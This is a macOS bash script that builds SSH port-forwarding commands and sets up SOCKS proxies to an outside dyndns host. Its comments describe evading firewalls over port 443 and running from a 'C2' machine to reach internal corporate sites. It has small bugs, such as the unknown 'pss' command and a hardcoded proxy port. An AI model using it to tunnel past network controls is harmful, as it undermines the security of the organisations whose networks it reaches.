#!/bin/bash

###########################################  VARIABLES  ###########################################
p='-p 443'                           # Port you use to evade legacy Firewalls (No AppID or traffic fingerprinting)
c='enelass@bidabeaws.dyndns.org'     # Your outbound SSH Server
cmd='sudo ssh -Cc blowfish '



###########################################  FUNCTIONS  ###########################################


# This function is useful for setting up a SOCKS proxy via SSH, ensuring that a tunnel is created only if one does not already exist.
# This helps in managing SSH tunnels efficiently and avoids creating multiple tunnels on the same port.
# Create a local SOCKS to access interal/corporate websites from outside (nested)
# -Nf: Options for SSH to not execute a remote command and to run in the background.
# -D $1: Specifies the local port to listen on for the SOCKS proxy.
function socks                       
{   
    tunnel=$(netstat -an | grep LIST | grep 127.0.0.1."$1")
    if [ -n "$tunnel" ]; then
        echo -e "TCP$1 is already listening on localhost: Attempting to use existing connection"  
    else
        echo "Creating SOCKS tunnel"
        cmd+=""$p" -Nf -D"$1" "$c""
        eval "$cmd"
    fi
}


# This function is useful for securely accessing internal or corporate websites by routing traffic through an SSH SOCKS proxy.
# This is to be executed from the adversarial machine (ssh server or C2)
function fsocks #Firefox socks (just tunnel the browser traffic)
{
    pD=${1-9150}; socks $pD
    #Kill existing instance of Firefox
    killall firefox-bin 2>/dev/null
    fxpref="$HOME/Library/Application Support/Firefox/Profiles/"
    fxpref="$fxpref`ls "$fxpref" | awk 'NR==1'`/prefs.js"
    sed -En -i'.backup' '/user_pref\("network\.proxy\.(socks|socks_port|type)"/!p
            $ a\
                user_pref("network.proxy.socks", "127.0.0.1");\
                user_pref("network.proxy.socks_port", 9150);\
                user_pref("network.proxy.type", 1);
                    ' "$fxpref"
    /Applications/Firefox.app/Contents/MacOS/firefox-bin -private > /dev/null 2>&1 &
}

# This function is useful for managing a system-wide SOCKS proxy on macOS, allowing users to easily enable or disable the proxy as needed.
# This is to be executed from the adversarial machine (ssh server or C2)
function ssocks #System-wide socks (tunnel all the machine traffic)
{
    pD=${1-9150}; socks $pD
    #Enable/Disable Socks Tunnel
    on=$(networksetup -getsocksfirewallproxy wi-fi | grep ": No")
    if [ -n "$on" ]; then
        echo "Turning on proxy"
        networksetup -setsocksfirewallproxystate wi-fi on
    else
        echo "Turning off proxy"
        networksetup -setsocksfirewallproxystate wi-fi off
    fi
}

###########################################  GUI  ###########################################
clear; echo -e "Select your choice and press [ENTER]\n[1] Default\n[2] Local port forwarding\n[3] Remote port forwarding\n[4] Dynamic port forwarding\n[5] Kill existing tunnel\n[*] Nevermind\n"
read -p "Option number : " n
case $n in
    1) cmd+="$p $c"; echo -n "$cmd" | pbcopy ; echo -e "The command has been saved in your clipboard" ;;
    2) echo -e "Server.app(311)\t\tWeb(80,443)\tVNC(5900)\tAFP(548)\tMySQL(3306)\tPostGreSQL(5432)\tMail(25,110,143,465,587,993,995)"
        read -p "Port number : " pn
        cmd+=""$p" -Nf -L"$pn":localhost:"$pn" "$c""; echo "$cmd" | pbcopy
        echo -e "The command has been saved in your clipboard";;
    3) read -p "Port number : " pn
        cmd+=""$p" -Nf -R"$pn":localhost:"$pn" "$c""; echo "$cmd" | pbcopy
        echo -e "The command has been saved in your clipboard";;
    4) clear; read -p "You will use a socks5 proxy, what port do you want to listen on ?" pD
        echo -e "Select your choice and press [ENTER]\n[1] System-Wise\n[2] User-Specific"
        read -p "Option number : " sn
        case $sn in
            1) ssocks $pD;;
            2) fsocks $pD;;
            *) exit;;
        esac;;
    5) pss ssh;;
    *) ;;
esac